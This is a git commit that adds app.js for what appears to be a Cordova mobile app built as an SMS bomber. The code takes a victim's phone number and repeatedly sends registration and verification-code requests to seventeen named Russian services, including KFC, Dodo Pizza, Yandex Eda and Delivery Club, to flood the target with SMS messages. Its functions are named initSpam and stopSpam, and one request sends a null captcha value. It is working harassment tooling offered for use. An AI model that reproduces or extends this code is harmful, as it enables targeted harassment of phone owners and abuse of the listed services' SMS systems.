a7ed4706bce6f314c9284ec879347c6dd1a01b95
clorenciago <46843985+clorenciago@users.noreply.github.com>
2019-03-21 21:47:53 +0300

    Create app.js

---
+++ app.js
@@ -0,0 +1,144 @@
+
+var inputBox = document.getElementById("numberForm");
+var repeatBox = document.getElementById("repeatForm");
+var statusAlert = document.getElementById("status-alert");
+var phone, servicesBase;
+var repeat = document.getElementById("repeatForm");
+var delay = document.getElementById("delayForm");
+var app = {};
+app.iterated = 0;
+app.status = false;
+app.globaldescr = false;
+var invalidChars = [
+  "-",
+  "+",
+  "e",
+];
+
+inputBox.addEventListener("input", function() {
+  this.value = this.value.replace(/[e\+\-]/gi, "");
+});
+
+inputBox.addEventListener("keydown", function(e) {
+  if (invalidChars.includes(e.key)) {
+    e.preventDefault();
+  }
+});
+
+repeatBox.addEventListener("input", function() {
+  this.value = this.value.replace(/[e\+\-]/gi, "");
+});
+
+repeatBox.addEventListener("keydown", function(e) {
+  if (invalidChars.includes(e.key)) {
+    e.preventDefault();
+  }
+});
+function beauty(number) {
+	return number.substring(0,2) + " " +"(" + number.substring(2,5) + ")" + " " + number.substring(5,8)+"-"+number.substring(8,10)+"-"+number.substring(10,12);
+}
+function initSpam() {
+	try {
+		if (!app.status ) { //ТУТ ДОХУЯ УСЛОВИЙ НА ПРОВЕРКУ НАДА ДЕДУ
+			phone = "+" + document.getElementById("numberForm").value;
+			servicesBase = [
+				{ name:"PIZZAPROSTO", req:"post", url:"https://api.pizza-prosto.ru/P_login_sms", type:"urlencoded", data:{'action':'registration','phone':phone.replace("+7","")} },
+				{ name:"AVTODISP", req:"get", url:"https://vse-taxi.com/sms-confirm-send.aspx?phone="+phone, type:"urlencoded", data:{'phone': phone} },
+				{ name:"FIXPRICE", req:"post", url:"https://fix-price.ru/ajax/register_phone_code.php", type:"urlencoded", data:{"register_call": "Y", "action": "getCode", "phone": phone} },
+				{ name:"URAMOBIL", req:"post", url:"https://service.uramobil.ru/profile/smstoken", type:"json", data:{"PhoneNumber":phone.replace("+7","7")} },
+				{ name:"VIASAT", req:"post", url:"https://api-production.viasat.ru/api/v1/auth_codes", type:"json", data:{"msisdn":phone} },
+				{ name:"SUNLIGHT", req:"post", url:"https://api.sunlight.net/v3/customers/authorization/", type:"json", data:{"phone":phone} },
+				{ name:"TAXI1331", req:"post", url:"https://1331.ru/api/register/?", type:"json", data:{"phone":phone,"office_id":"1"} },
+				{ name:"WELNY", req:"post", url:"https://welny.ru/api/users", type:"json", data:{"jsonrpc":"2.0", "id":"1", "lang":"ru", "method":"login_init", "params":{"phone": phone}} },
+				{ name:"KFC", req:"post", url:"https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", type:"json", data:{"phone":phone} },
+				{ name:"SAMARATAXI", req:"post", url:"https://samarataxi.ru/an_site/new_create_order/json_requestpin.php?type=request&phone={}&_=1551301699484".replace("{}",phone.replace("+7","8")), type:"json", data:{} }, //ПРОВЕРИТЬ
+				{ name:"BURGERKING", req:"post", url:"https://1869.smartomato.ru/account/session", type:"json", data:{"phone":phone, "g-recaptcha-response":"null"} },
+				{ name:"YANDEXEDA", req:"post", url:"https://eda.yandex/api/v1/user/request_authentication_code", type:"json", data:{"phone_number":phone.replace("+7","")} },
+				{ name:"DELIVERYCLUB", req:"post", url:"https://www.delivery-club.ru/ajax/user_otp", type:"urlencoded", data:{"phone":phone.replace("+7","7")} },
+				{ name:"RADUGAVKUSA", req:"post", url:"https://cheboksari.rvkusa.com/ajax/registration", type:"urlencoded", data:{"phone":phone,"step":"1"} },
+				{ name:"DODOPIZZA", req:"post", url:"https://dodopizza.ru/api/sendconfirmationcode", type:"urlencoded", data:{"phoneNumber":phone.replace("+7","7")} },
+				{ name:"PANPIZZA", req:"post", url:"https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", type:"urlencoded", data:{"telephone":phone.replace("+7","8")} },
+				{ name:"MSTAXI", req:"post", url:"http://www.taxi-ms.ru/ajax.php", type:"urlencoded", data:{"action": "request.call", "phone": beauty(phone), "siteId": "uf"} }
+			];
+			document.getElementById("startButton").innerHTML = "Остановить";
+			statusAlert.innerHTML = "Enabled";
+			statusAlert.className = "alert alert-success text-center mx-auto mt-3 status-alert";
+			app.status = true;
+			app.iterated = 0;
+			app.globaldescr = true;
+			for (let i = 0; i < repeat.value; i++) {
+				if (app.status) {
+					app.globaldescr = setTimeout(childloop, (delay.value * servicesBase.length) * i);
+				}
+			}
+		} else if (app.status) { 
+			stopSpam();
+		}
+	} catch(e) { alert(e.stack); }
+	
+}
+
+function childloop() {
+	if (app.status) {
+		servicesBase.forEach(function(item, i, arr) {
+   			let k = i;
+    		app.descr = setTimeout(function(){
+       			requestSender( phone, item.type, item.url, item.data, item.name, item.req );
+       			++app.iterated;
+    			if ( app.iterated >= repeat.value * servicesBase.length) {console.log("ALL"); stopSpam();}
+    		}, delay.value * (k + 1));
+		});
+	}
+}
+
+function stopSpam() {
+	app.iterated = 3;
+	app.status = false;
+	clearTimeout(app.descr);
+	clearTimeout(app.globaldescr);
+	document.getElementById("startButton").innerHTML = "Начать";
+	statusAlert.innerHTML = "Disabled";
+	statusAlert.className = "alert alert-danger text-center mx-auto mt-3 status-alert";
+
+}
+function requestSender(number,type,url,data,name,req) {
+  if (req=="post") {
+	  cordova.plugin.http.setRequestTimeout(2.0);
+	  cordova.plugin.http.setDataSerializer(type);
+	  cordova.plugin.http.post(url, data, { Authorization: 'OAuth2: token' }, function(response) {
+	    // prints 200
+	    console.log(response.status);
+	    try {
+	      response.data = JSON.parse(response.data);
+	      // prints test
+	      console.log(response.data.message);
+	    } catch(e) {
+	      console.error('JSON parsing error');
+	    }
+	  }, function(response) {
+	    // prints 403
+	    console.log(response.status);
+	   
+	    //prints Permission denied
+	    console.log(response.error);
+	  });
+	} else if (req=="get") {
+		cordova.plugin.http.setRequestTimeout(2.0);
+	  	cordova.plugin.http.setDataSerializer(type);
+		cordova.plugin.http.get(url, {}, { Authorization: 'OAuth2: token' }, function(response) {
+		  console.log(response.status);
+		}, function(response) {
+		  console.error(response.error);
+		});
+	}
+  	
+}
+
+function toggleTheme(theme) {
+	window.localStorage.setItem('theme', theme);
+	window.location.replace(theme+"_index.html");
+}
+
+function localClear() {
+	window.localStorage.clear();
+}
